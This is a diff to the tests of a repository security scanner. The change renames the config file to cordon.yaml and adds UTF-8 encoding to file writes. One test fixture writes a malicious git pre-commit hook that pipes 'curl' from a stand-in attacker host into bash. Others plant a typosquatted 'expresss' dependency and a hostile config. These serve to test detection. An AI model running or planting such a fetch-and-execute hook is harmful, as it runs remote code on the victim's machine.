@@ -36,20 +36,24 @@ class TestM03YamlParser:
     def test_a_duplicate_key_is_refused(self, tmp_path) -> None:
         """Last-win silently let a hostile config put the benign value where a
         reviewer reads it and the real one fifty lines down."""
-        path = tmp_path / "cordon_scanner.yaml"
-        path.write_text('scan:\n  exclude: []\n  exclude: ["**/*"]\n')
+        path = tmp_path / "cordon.yaml"
+        path.write_text('scan:\n  exclude: []\n  exclude: ["**/*"]\n', encoding="utf-8")
         with pytest.raises(ConfigError, match="duplicate key"):
             Config.from_file(path)
 
     def test_an_oversized_config_is_refused(self, tmp_path) -> None:
-        path = tmp_path / "cordon_scanner.yaml"
-        path.write_text("# " + "x" * (2 * 1024 * 1024) + "\nscan:\n  offline: true\n")
+        path = tmp_path / "cordon.yaml"
+        path.write_text(
+            "# " + "x" * (2 * 1024 * 1024) + "\nscan:\n  offline: true\n", encoding="utf-8"
+        )
         with pytest.raises(ConfigError, match="limit"):
             Config.from_file(path)
 
     def test_an_ordinary_inline_mapping_still_parses(self, tmp_path) -> None:
-        path = tmp_path / "cordon_scanner.yaml"
-        path.write_text("policy:\n  fail_on:\n    - high\n    - category: malicious\n")
+        path = tmp_path / "cordon.yaml"
+        path.write_text(
+            "policy:\n  fail_on:\n    - high\n    - category: malicious\n", encoding="utf-8"
+        )
         assert Config.from_file(path).policy.fail_on_categories
 
 
@@ -61,11 +65,13 @@ class TestM02Containment:
         stop exactly that."""
         outside = tmp_path / "repo-evil"
         outside.mkdir()
-        (outside / "cordon_scanner.yaml").write_text("scan:\n  severity_threshold: critical\n")
+        (outside / "cordon.yaml").write_text(
+            "scan:\n  severity_threshold: critical\n", encoding="utf-8"
+        )
 
         root = tmp_path / "repo"
         root.mkdir()
-        (root / "cordon_scanner.yaml").symlink_to(outside / "cordon_scanner.yaml")
+        (root / "cordon.yaml").symlink_to(outside / "cordon.yaml")
 
         with pytest.raises(ConfigError, match="outside the scan root"):
             ConfigResolver.resolve(root=root)
@@ -138,7 +144,7 @@ class TestM12DeadConfiguration:
             base64.b64encode(hashlib.sha256(str(i).encode()).digest()).decode() for i in range(80)
         )[:3000]
         (tmp_path / "dist").mkdir()
-        (tmp_path / "dist" / "bundle.js").write_text(blob + "\n")
+        (tmp_path / "dist" / "bundle.js").write_text(blob + "\n", encoding="utf-8")
 
         assert "SUSPECT.OBFUSCATION.LONGLINE.001" in rule_ids(tmp_path)
         quiet = config(minified=("dist/**",))
@@ -156,8 +162,8 @@ class TestM12DeadConfiguration:
             # repository and a complete decode-and-execute literal here is a
             # true positive. The tool should not need an exception for itself.
         )
-        (tmp_path / "install").write_text(body)
-        (tmp_path / "install.py").write_text(body)
+        (tmp_path / "install").write_text(body, encoding="utf-8")
+        (tmp_path / "install.py").write_text(body, encoding="utf-8")
 
         found = {
             f.location.path
@@ -179,13 +185,13 @@ class TestM07GitHooks:
         (tmp_path / ".git" / "hooks").mkdir(parents=True)
         (tmp_path / ".git" / "objects" / "ab").mkdir(parents=True)
         (tmp_path / ".git" / "objects" / "ab" / "deadbeef").write_bytes(b"\x00binary")
-        (tmp_path / ".git" / "config").write_text("[core]\n")
-        (tmp_path / "a.js").write_text("const x = 1;\n")
+        (tmp_path / ".git" / "config").write_text("[core]\n", encoding="utf-8")
+        (tmp_path / "a.js").write_text("const x = 1;\n", encoding="utf-8")
         return tmp_path
 
     def test_a_malicious_hook_is_found(self, repo) -> None:
         (repo / ".git" / "hooks" / "pre-commit").write_text(
-            "#!/bin/sh\ncurl -sSL https://evil.invalid/x | bash\n"
+            "#!/bin/sh\ncurl -sSL https://evil.invalid/x | bash\n", encoding="utf-8"
         )
         found = {
             f.location.path
@@ -214,11 +220,12 @@ class TestM09SarifLocations:
         """GitHub code scanning cannot anchor an alert to an empty URI, so the
         entire dependency layer was invisible in the integration that is the
         product's main CI story."""
-        (tmp_path / "package.json").write_text('{"name":"app","version":"1.0.0"}')
+        (tmp_path / "package.json").write_text('{"name":"app","version":"1.0.0"}', encoding="utf-8")
         (tmp_path / "package-lock.json").write_text(
             '{"lockfileVersion":3,"packages":{"":{"name":"app"},'
             '"node_modules/expresss":{"version":"4.18.2",'
-            '"resolved":"https://registry.npmjs.org/expresss/-/expresss-4.18.2.tgz"}}}'
+            '"resolved":"https://registry.npmjs.org/expresss/-/expresss-4.18.2.tgz"}}}',
+            encoding="utf-8",
         )
         result = Scanner(config()).scan(tmp_path)
         dependency_findings = [f for f in result.findings if f.evidence.kind.value == "graph"]
@@ -256,7 +263,7 @@ rules:
         from cordon_scanner.rules.loader import RuleLoader
 
         path = tmp_path / "p.yaml"
-        path.write_text(self.PACK.format(req=requirement))
+        path.write_text(self.PACK.format(req=requirement), encoding="utf-8")
         return RuleLoader().load_file(path)
 
     @pytest.mark.parametrize("requirement", [">=0.1", "==0.1", ">=0.1,<2.0"])
@@ -283,14 +290,14 @@ class TestM19PathDisclosure:
         """In CI an absolute root exposes runner directory layouts, internal
         project names and sometimes usernames, into artefacts routinely uploaded
         to third parties."""
-        (tmp_path / "a.py").write_text("x = 1\n")
-        (tmp_path / "cordon_scanner.yaml").write_text('scan:\n  exclude:\n    - "**/*"\n')
+        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
+        (tmp_path / "cordon.yaml").write_text('scan:\n  exclude:\n    - "**/*"\n', encoding="utf-8")
         cfg = ConfigResolver.resolve(root=tmp_path).with_overrides(use_cache=False)
         for finding in Scanner(cfg).scan(tmp_path).findings:
             assert not finding.location.path.startswith("/")
 
     def test_the_repository_root_serialises_as_a_name(self, tmp_path) -> None:
-        (tmp_path / "a.py").write_text("x = 1\n")
+        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
         result = Scanner(config()).scan(tmp_path)
         assert result.repository is not None
         assert "/" not in result.repository.to_dict()["root"]
